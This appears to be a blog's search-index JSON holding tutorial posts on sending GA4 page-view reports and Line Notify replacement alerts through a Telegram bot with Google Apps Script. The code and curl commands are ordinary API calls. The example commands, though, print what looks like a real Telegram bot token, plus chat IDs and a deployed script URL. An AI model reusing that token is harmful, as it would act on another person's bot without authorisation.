\"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}Convert it into code:function execute() { Logger.log(JSON.stringify(fetchScreenPageViews(\"318495208\")));}// Split into independent methods for easy reuse...// Default startDate=7daysAgo, endDate=yesterday// Other usages:// e.g. fetchScreenPageViews(\"1111\", \"3daysAgo\", \"yesterday\")// e.g. fetchScreenPageViews(\"2222\", \"yesterday\", \"today\")function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}Code explanation:// Metrics can be multiple; declare them separately...const screenPageViewsMetric = AnalyticsData.newMetric();screenPageViewsMetric.name = \"screenPageViews\";// For example, another metric active1DayUsers:const active1DayUsersMetric = AnalyticsData.newMetric();active1DayUsersMetric.name = \"active1DayUsers\";// Declare the date rangeconst dateRange = AnalyticsData.newDateRange();dateRange.startDate = startDate;dateRange.endDate = endDate;// Dimensions can be multiple; declare them separately...const pageTitleDimension = AnalyticsData.newDimension();pageTitleDimension.name = \"pageTitle\";// For example, another dimension:const firstUserSourceMediumDimension = AnalyticsData.newDimension();firstUserSourceMediumDimension.name = \"firstUserSourceMedium\";// Generate the Request objectconst request = AnalyticsData.newRunReportRequest();request.metrics = [active1DayUsersMetric, screenPageViewsMetric]; // Include multiple...request.dimensions = [pageTitleDimension, firstUserSourceMediumDimension]; // Include multiple...request.dateRanges = dateRange;// Only need the top 10 records (Top 10)request.limit = 10;// Set the data aggregation logic: Total (SUM)request.metricAggregations = \"TOTAL\";// Generate the query resultreturn AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId).rows;The first execution will require authorization (you will need to re-authenticate if you add new permissions later): Essentially, this authorizes Google Apps Script to execute these programs using your account identity, so ensure that the account you choose has the corresponding access rights to the GA reports. After writing the code, click “Debug” -&gt; Click “Review Permissions”. Select the account to execute, which usually equals the current Google Apps Script account. Choose “Advanced” to expand -&gt; Click “Go to XXX”.This is an application we wrote for our own use, so it does not need to go through Google verification. Click “Allow”.After allowing, click “Debug” or “Run” to execute the program:![](/assets/1e85b8df2348/1*DbcQnfp8xdJCFnrDc778tw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjY1IiBoZWlnaHQ9IjEwMDYiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }Here, we first use `Logger.log(JSON.stringify())` to obtain the output result:```json{ \"kind\": \"analyticsData#runReport\", \"dimensionHeaders\": [ { \"name\": \"pageTitle\" } ], \"rowCount\": 71, \"metadata\": { \"currencyCode\": \"TWD\", \"timeZone\": \"Asia/Taipei\" }, \"rows\": [ { \"dimensionValues\": [ { \"value\": \"ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"166\" } ] }, { \"metricValues\": [ { \"value\": \"109\" } ], \"dimensionValues\": [ { \"value\": \"Unboxing the Apple Watch Original Stainless Steel Milanese Loop | ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"Using the 'Shortcuts' Automation Feature with Mijia Smart Home on iOS ≥ 13.1 | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"101\" } ] }, { \"dimensionValues\": [ { \"value\": \"The Medium Partner Program is Finally Open to Global (Including Taiwan) Writers! | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"85\" } ] }, { \"metricValues\": [ { \"value\": \"77\" } ], \"dimensionValues\": [ { \"value\": \"iOS Shortcuts Automation Use Cases — Automatically Forwarding Messages and Creating Reminders | ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"51\" } ], \"dimensionValues\": [ { \"value\": \"Travel Diary 9/11 One-Day Flash Trip to Nagoya | ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"42\" } ], \"dimensionValues\": [ { \"value\": \"The Past and Present of iOS Privacy and Convenience | ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS Vision Framework x WWDC 24 Discover Swift Enhancements in the Vision Framework Session | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"34\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ≥ 18 NSAttributedString Attributes Range Merging Behavior Change | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"30\" } ] }, { \"metricValues\": [ { \"value\": \"30\" } ], \"dimensionValues\": [ { \"value\": \"The Story of Building an HTML Parser by Hand | ZhgChgLi\" } ] } ], \"metricHeaders\": [ { \"type\": \"TYPE_INTEGER\", \"name\": \"screenPageViews\" } ], \"totals\": [ { \"dimensionValues\": [ { \"value\": \"RESERVED_TOTAL\" } ], \"metricValues\": [ { \"value\": \"1229\" } ] } ]} Google Apps Script successfully requested GA data! 🎉🎉🎉Step 3. Putting It All Together! Google Apps Script + GA4 + Telegram BotBased on the previous article “Quickly Transitioning from Line Notify to Telegram Bot Notifications in 10 Minutes”, create your Telegram Bot to obtain the Bot Token and the Channel Chat ID you want to send messages to.const telegramToken = \"XXXX\" // Insert your Telegram Bot Token//function execute() { const screenPageViewsReport = fetchScreenPageViews(\"318495208\"); // const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"Total Views: \" + total.toLocaleString() + \"\\n\"; screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \" + (index + 1) + \"] \" + pageTitle + \": \" + value.toLocaleString() + \"\\n\"; }); sendNotifyMessage(message, -xxxx); // Insert your Channel Chat ID}// Send message to the specified Telegram Channel Chat IDfunction sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\" + telegramToken + \"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); if (data[\"ok\"] == undefined || data[\"ok\"] != true) { if (data[\"error_code\"] != undefined &amp;&amp; data[\"error_code\"] == 429) { Utilities.sleep(1000); sendNotifyMessage(message, chatId); } }}function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}Code Explanation://... // Find the total position in the returned JSON from the report, parseInt converts the string to INT format // .toLocaleString() -&gt; formats the number, 123456 -&gt; 123,456 const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"Total Views: \" + total.toLocaleString() + \"\\n\"; // Iterate through the data returned from the report JSON to assemble the message screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \" + (index + 1) + \"] \" + pageTitle + \": \" + value.toLocaleString() + \"\\n\"; });//...Execution: Click the “Run” or “Debug” button above and ensure the method name is set to “ execute “: Success! 🎉🎉🎉Setting Up Scheduled Automatic ExecutionThe final step is to have the report bot execute automatically on a schedule. Go to “Triggers” from the left menu: Click the “Add Trigger” button in the bottom right corner Choose the function to execute: select the “ execute “ method name Choose the deployment to run: select “ Head “ Select the event source: choose “ Time-driven “ Select the type of time-based trigger: choose your desired trigger frequency Select the time period: choose the time you want it to automatically trigger daily If execution fails… set the frequency for notification emails Save Done! It will automatically execute at the scheduled time. 🎉🎉🎉Extended TasksOther data such as new user counts, source mediums, etc., can also be achieved using the previous code, so I won’t repeat it here. Consider it as homework for everyone.If you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 594 Total Views Last Statistics Date: 2025-08-15 | 570 Views on Medium." }, { "title": "10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知", "url": "/posts/zrealm-robotic-process-automation/10-%E5%88%86%E9%90%98%E5%BF%AB%E9%80%9F%E7%A7%BB%E8%BD%89-line-notify-%E5%88%B0-telegram-bot-%E9%80%9A%E7%9F%A5-6922e90ba90c/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, line, telegram, google-apps-script, automation", "date": "2024-10-12 21:10:46 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知手把手將 Line Notify 個人通知服務遷移至同樣免費、更強大的 Telegram BotPhoto by Lana CodesLINE No...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知手把手將 Line Notify 個人通知服務遷移至同樣免費、更強大的 Telegram BotPhoto by Lana CodesLINE Notify結束服務公告 感謝您長期以來使用LINE Notify。 LINE Notify自2016年9月推出以來，一直致力於為開發者提供服務。為能提供更優質的服務，並將經營資源集中於後續的類似商品服務，我們決定於2025年3月31日結束本服務。對於長期以來支持並使用LINE作為通知連動服務的所有用戶，我們深表感謝。 若您仍需使用LINE向用戶傳送通知的商品服務，建議可改用功能更豐富的Messaging API。擷取自 Line Notify 官網 ， Line 於 2024/10/08 發文公告 Line Notify 將於 2025/04/01 完全關閉，如需繼續使用 Line 做為訊息通知，只能用付費的 Message API 。Line Notify 的優點是非常容易串接，拿來做個人通知機器人非常方便好用，一些 Line Bot 或第三方服務也會使用 Line Notify 進行通知 (例如：路易莎、你訂的訂單通知功能)；但缺點也蠻多的，例如訊息內容單一、無法分群組(統一都是傳送到 Line Notify Bot)、訊息內容長度有限…等等隨著 Line Notify 宣告終止，正好也給我了一個遷移至其他通訊、通知服務的機會： Slack：免費版訊息只保留 30 天、我的通知比較是個人，用 Slack 有點大材小用。(Slack 傳送訊息可參考我之前的文章： Slack &amp; ChatGPT Integration ) Discord：我的通知比較是個人，一樣有點大材小用。 Telegram：免費、幾乎無限使用。對我來說 Telegram 的通訊服務比較符合我原本 Line Notify 的使用需求，我需要一個能接收通知的頻道，最好是能依照不同需求有不同的頻道，可接受的內容、格式越豐富越好、並且能快速簡單串接；Telegram 都符合上述需求，還能多實現跟 Bot 的交互功能。成果先上最終效果圖(以 Github Star 通知、Repo Stats 通知為例 )： ✅ 有人按 Repo 星星時會觸發 Webhook -&gt; Google Apps Script -&gt; Telegram Bot 發送通知到 Telegram — Github Stats Group ✅ Google Apps Script 每日定時 -&gt; 撈取 Github Repo Stats 狀態 -&gt; Telegram Bot 發送通知到 Telegram — Github Stats Group ✅ 使用 /update Telegram Bot Command 觸發撈取 Github Repo Stats 狀態 -&gt; Telegram Bot 發送通知到 Telegram — Github Stats Group對比原本 Line Notify ❌ 所有訊息無法分類、分群組都傳到 Line Notify ❌ 無法針對個別訊息做特殊設定 (如通知聲、靜音…) ❌ 無法輸入訊息互動本文目錄 設定 Telegram Bot 移轉 Line Notify 發送訊息到 Telegram Bot (Google Apps Script) 與 Telegram Bot 交互 (Command) x 使用 Google Apps Script(1/2) 設定 Telegram BotTelegram Bot 的申請非常簡單，連網頁都不需要開，只要跟官方的 BotFather 機器人 互動就可以了。Step 1. 申請 Telegram Bot安裝、註冊好 Telegram 服務 之後，點擊加「 BotFather 機器人 」為好友。 打開、加入 BotFather 機器人 加入後直接傳送訊息「 /newbot 」建立你的機器人。 輸入你的機器人名稱 輸入你的機器人帳號 (不可重複、必須以 bot 為結尾，例如我的 zhgchgli_bot ) 你的 Bot 連結，點進進入開始使用 (e.g. t.me/harrytest56_bot) 取得 你的_BOT_API_Token ， 請妥善保存 ⚠️⚠️⚠️點擊 4. 取得的 Bot 連結，開始使用 Bot：目前無任何功能，可以點右上角 Info，編輯名稱或上傳大頭貼。Step 2. 創建 Telegram 通知 Group &amp; 加入機器人帳號 我希望不同的個人通知類型傳到不同的 Group，這 邊因為 Demo 只創建一個 My Notify Group 。 你可以依據實際需求創建不同的 Group &amp; 依照步驟加入、設定機器人。 New Group 搜尋你的機器人帳號＆點擊加入 設定 Group 名稱、大頭貼Step 3. 取得 Group Chat IDTelegram Bot API 沒有直接取得 Group 列表、Group Chat ID 的 Endpoint，只能透過 /getUpdates 取得機器人訊息列表，並從中找到 Group Chat ID：Request:curl 'https://api.telegram.org/bot你的_BOT_API_Token/getUpdates' Telegram API 格式為 https://api.telegram.org/bot 你的_BOT_API_Token /getUpdates ， BOT API Token 字串前要加上 bot 字串 範例： curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/getUpdates'Response:{ \"ok\": true, \"result\": [ { \"update_id\": 706454235, \"my_chat_member\": { \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": false }, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"date\": 1728726861, \"old_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"left\" }, \"new_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"member\" } } }, { \"update_id\": 706454236, \"message\": { \"message_id\": 1, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726861, \"group_chat_created\": true } }, { \"update_id\": 706454237, \"message\": { \"message_id\": 2, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726864, \"new_chat_photo\": [ { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANhAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQAAQ\", \"file_size\": 5922, \"width\": 160, \"height\": 160 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANiAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFRn\", \"file_size\": 15097, \"width\": 320, \"height\": 320 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANjAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQB\", \"file_size\": 37988, \"width\": 640, \"height\": 640 } ] } } ]}可以從回應中找到對應 Group Name + type=group 的巢狀 JSON 資料，其中的 id 就是 Group Chat ID:\"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": false} Group Chat Id = -4532420331 ⚠️⚠️⚠️️ 如果你的 Response 為空 { \"ok\": true, \"result\": [] } 請嘗試在你的 Group 發送訊息 (e.g. Hello ) 再重新 Call API 應該就有了。Step 4. 發送訊息我們可以使用 /sendMessage 發送訊息到 Group。Request:curl 'https://api.telegram.org/bot你的_BOT_API_Token/sendMessage' \\--form 'chat_id=\"Group Chat Id\"' \\--form 'text=\"訊息內容\"'範例：curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/sendMessage' \\--form 'chat_id=\"-4532420331\"' \\--form 'text=\"test\"' API 參數可參考官方文件Response &amp; Result:{ \"ok\": true, \"result\": { \"message_id\": 5, \"from\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728727847, \"text\": \"test\" }} 發送成功取得以上 Response 回 Telegram Group 就會出現剛發送的訊息內容。(2/2) 移轉 Line Notify 發送訊息到 Telegram Bot (Google Apps Script)我的個人通知機器人服務是使用 Google Apps Script 達成的，因此以 Google Apps Script 轉換為例 (類 JavaScript)。原始的 Line Notify 發送程式碼：const lineToken = \"XXXX\";function sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}可以看到非常簡單方便好用…移轉成 Telegram Bot 發送程式碼：const telegramToken = \"你的_BOT_API_Token\";const TelegramChatId = { GA: -123456, GITHUB: -123457, MEDIUM: -123458};function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}照前面 Telegram Bot 設定步驟取得的資訊。 telegramToken = 你的_BOT_API_Token TelegramChatId 這邊是我自己多定義的方法，因為實務上我希望不同的通知分別傳送到不同的 Group，因此定義了一個結構管理目標 Group 與他的 Group Chat Id 。/sendMessage API 參數，更多參數、細節可參考官方文件 ，以下是我自己會用到的參數： text: 訊息內容 (必帶) chat_id: 目標 Group Chat Id (必帶) parse_mode: 訊息內容解析方式，這邊我指定 Markdown disable_web_page_preview: 訊息內容的連結是否不要預覽，這邊設 true 關閉，可以讓訊息顯示更簡潔。使用方式：sendNotifyMessage(\"Hello\", TelegramChatId.MEDIUM) // 發送 Hello 訊息到 MEDIUM Group Chat IdsendNotifyMessage(\"Hello\", -1234) // 發送 Hello 訊息到 -1234 Group Chat Id成果以我的 Github Repo Star Notifier 機器人 為例： 驗證成功！ 當有人按我的 Repo Star 時能正確改發送通知到 Telegram Group！🎉🎉🎉 製作方式可參考我之前的文章「 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier 」設定特殊聲音或靜音比 Line Notify 更棒的事是我們還可以對不同的 Group 設定不同的通知聲音或是靜音。與 Telegram Bot 交互 (Command) x 使用 Google Apps Script除了替代 Notify 功能之外， Telegram Bot 還能輕易地實現與使用者交互的功能 — Telegram Bot Command。回到我的使用場景，我的機器人會定時或是 Webhook 觸發傳送通知訊息送給我；但有時候我也想手動觸發機器人立刻取得當前結果，以往 Line Notify 沒有這個功能，以 Google Apps Script 來說就只能暴力的設定一個網址，只要打開網址就會觸發，很不好用。Telegram Bot Command 就能讓我直接輸入指令訊息，命令機器人立刻執行我想做的事情。 本文以 Goolge Apps Script 為例，Google Apps Script 詳細介紹可參考我之前文章「 使用 Google Apps Script 實現 Google 服務 RPA 自動化 」。Step 1. 使用 Google Apps Script 實現 Command 處理邏輯 前往 Google Apps Script 首頁 左上方「建立新專案」 點擊「未命名專案」輸入專案名稱 e.g. Telegram 貼上基礎程式碼：const telegramToken = \"你的_BOT_API_Token\";function doPost(e) { const content = JSON.parse(e.postData.contents); if (content.message &amp;&amp; content.message.text) { const command = content.message.text.split(' ')[0]; const chatId = content.message.chat.id; if (command.startsWith(\"/update\")) { // 收到 /update 指令 // 在這邊處理你想做的事...然後回應... sendNotifyMessage(\"你好.....\\n指令:\"+command, chatId); } } return HtmlService.createHtmlOutput(\"OK!\");}function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());} telegramToken = 你的_BOT_API_Token 上述 Demo 程式我們在收到 Post 請求、Command 參數等於 /update 時回應 你好… 模擬收到指令後處理後回應的場景。Step 2. 完成 Google Apps Script Web 部署 右上角「部署」-&gt; 「新增部署作業」 左上角「設定」-&gt;「網頁應用程式」 誰可以存取選擇「所有人」 新增部署作業，選擇「授予存取權」 跳出帳號視窗，選擇你的 Google 登入帳號 跳出警告視窗，選擇「Advanced」-&gt;「Go to 專案名稱 (unsafe)」 選擇「Allow」 網頁應用程式網址： 你的 Webhook 網址 。 複製下來。e.g. https://script.google.com/macros/s/AKfycbx2oFv-eB4LezdOk3P3aoEZVhx_PI6n_YnTNP7WVVQSaiRU52di5bKNThsvIZxus3Si/exec Google Apps Script 網頁應用程式部署、更新、使用、除錯可參考我之前的文章「 使用 Google Apps Script 實現 Google 服務 RPA 自動化 」。 ⚠️⚠️⚠️ 請注意，如果 Google Apps Script 程式碼有變更要點擊部署-&gt;管理部署-&gt;選擇建立新版本才會生效，細節可參考上述文章。 ⚠️⚠️⚠️請注意，如果 Google Apps Script 程式碼有變更要點擊部署-&gt;管理部署-&gt;選擇建立新版本才會生效，細節可參考上述文章。 ⚠️⚠️⚠️請注意，如果 Google Apps Script 程式碼有變更要點擊部署-&gt;管理部署-&gt;選擇建立新版本才會生效，細節可參考上述文章。Step 3. 註冊 Webhook使用 Telegram API /setWebhook 註冊你的 Webhook 網址。Request:curl --location 'https://api.telegram.org/你的_BOT_API_Token/setWebhook' \\--form 'url=\"你的 Webhook 網址\"'Response:{ \"ok\": true, \"result\": true, \"description\": \"Webhook was set\"}測試 我們會根據不同的 Chat Id 回應，因此不管是 1:1 對機器人或是有機器人在的 Group 群組都能回應。 成功 🎉🎉🎉下篇： 簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人其他 Google Apps Script 自動化文章 使用 Google Apps Script 實現 Google 服務 RPA 自動化 Slack &amp; ChatGPT Integration 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier附註本文也是我 Medium 的第 100 篇文章(2018/10 發表 第一篇 ，6 年了)，堅持不懈、繼續努力，詳細心得跟數據等到破 1000 Followers (2024/10 目前 925) 或是總瀏覽數破 1,000,000 (2024/10 目前 984,549) 時再來分享。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 7,876 Total Views Last Statistics Date: 2025-08-15 | 7,100 Views on Medium." }, { "title": "Quickly Transfer Line Notify to Telegram Bot Notifications in 10 Minutes", "url": "/posts/zrealm-robotic-process-automation/en/quickly-transfer-line-notify-to-telegram-bot-notifications-in-10-minutes-6922e90ba90c/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, line, telegram, google-apps-script, automation", "date": "2024-10-12 21:10:46 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Quickly Transfer Line Notify to Telegram Bot Notifications in 10 MinutesA step-by-st...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Quickly Transfer Line Notify to Telegram Bot Notifications in 10 MinutesA step-by-step guide to migrating the Line Notify personal notification service to the equally free and more powerful Telegram Bot.Photo by Lana CodesLINE Notify Service Termination Announcement Thank you for using LINE Notify for a long time. Since its launch in September 2016, LINE Notify has been dedicated to providing services for developers. To offer better services and focus resources on subsequent similar products, we have decided to terminate this service on March 31, 2025. We sincerely thank all users who have supported and used LINE as a notification service. If you still need to send notifications to users via LINE, we recommend switching to the more feature-rich Messaging API.Excerpt from Line Notify Official Website, where Line announced on October 8, 2024, that Line Notify will be completely shut down on April 1, 2025. If you wish to continue using Line for message notifications, you can only use the paid Message API.The advantage of Line Notify is that it is very easy to integrate, making it very convenient for personal notification bots. Some Line Bots or third-party services also use Line Notify for notifications (e.g., Louisa, order notification features); however, it has many drawbacks, such as limited message content, inability to group messages (all sent to the Line Notify Bot), and limited message length, among others.With the announcement of Line Notify’s termination, it also provides me with an opportunity to migrate to other communication and notification services: Slack: The free version retains messages for only 30 days, and since my notifications are more personal, using Slack feels a bit excessive. (For sending messages via Slack, refer to my previous article: Slack &amp; ChatGPT Integration) Discord: Again, my notifications are personal, making it feel a bit excessive. Telegram: Free and nearly unlimited usage.For me, Telegram’s communication service better meets my original needs for Line Notify. I need a channel that can receive notifications, ideally with different channels for different needs, and the more diverse the content and format, the better. Additionally, it should be quick and easy to integrate; Telegram meets all these requirements and also allows for interaction with bots.ResultsFirst, here’s the final effect image (using Github Star notifications and Repo Stats notifications as examples): ✅ When someone stars the Repo, it triggers a Webhook -&gt; Google Apps Script -&gt; Telegram Bot sends a notification to Telegram — Github Stats Group ✅ Google Apps Script runs daily -&gt; fetches Github Repo Stats status -&gt; Telegram Bot sends a notification to Telegram — Github Stats Group ✅ Using the /update Telegram Bot Command triggers fetching Github Repo Stats status -&gt; Telegram Bot sends a notification to Telegram — Github Stats GroupComparison with Original Line Notify ❌ All messages cannot be categorized; they are all sent to Line Notify ❌ Cannot set special settings for individual messages (e.g., notification sound, mute, etc.) ❌ Cannot interact with messagesTable of Contents Setting Up Telegram Bot Migrating Line Notify Messages to Telegram Bot (Google Apps Script) Interacting with Telegram Bot (Command) x Using Google Apps Script(1/2) Setting Up Telegram BotApplying for a Telegram Bot is very simple; you don’t even need to open a webpage, just interact with the official BotFather bot.Step 1. Apply for a Telegram BotAfter installing and registering for Telegram services, click to add the BotFather bot as a friend. Open and join the BotFather bot. After joining, send the message “/newbot” to create your bot. Enter your bot’s name. Enter your bot’s username (must be unique and end with bot, e.g., my zhgchgli_bot). Your Bot link, click to start using it (e.g., t.me/harrytest56_bot). Obtain your YOUR_BOT_API_Token, please keep it safe ⚠️⚠️⚠️.Click on the link obtained in step 4 to start using the Bot:Currently, there are no functions; you can click the info icon in the upper right corner to edit the name or upload a profile picture.Step 2. Create a Telegram Notification Group &amp; Add the Bot Account I want different types of personal notifications to go to different Groups, so for the demo, I only created one My Notify Group. You can create different Groups based on your actual needs and follow the steps to add and set up the bot. New Group Search for your bot account &amp; click to join. Set the Group name and profile picture.Step 3. Obtain Group Chat IDThe Telegram Bot API does not have a direct endpoint to obtain the list of Groups or Group Chat IDs; you can only get the bot’s message list through /getUpdates and find the Group Chat ID from there:Request:curl 'https://api.telegram.org/botYOUR_BOT_API_Token/getUpdates' The Telegram API format is https://api.telegram.org/bot YOUR_BOT_API_Token /getUpdates, and the BOT API Token string must be prefixed with bot. Example: curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/getUpdates'Response:{ \"ok\": true, \"result\": [ { \"update_id\": 706454235, \"my_chat_member\": { \"chat\": { \"id\": -4532420331, \"title\": \"My Notify\", \"type\": \"group\", \"all_members_are_administrators\": false }, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"date\": 1728726861, \"old_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"left\" }, \"new_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"member\" } } }, { \"update_id\": 706454236, \"message\": { \"message_id\": 1, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Notify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726861, \"group_chat_created\": true } }, { \"update_id\": 706454237, \"message\": { \"message_id\": 2, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Notify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726864, \"new_chat_photo\": [ { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANhAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQAAQ\", \"file_size\": 5922, \"width\": 160, \"height\": 160 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANiAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFRn\", \"file_size\": 15097, \"width\": 320, 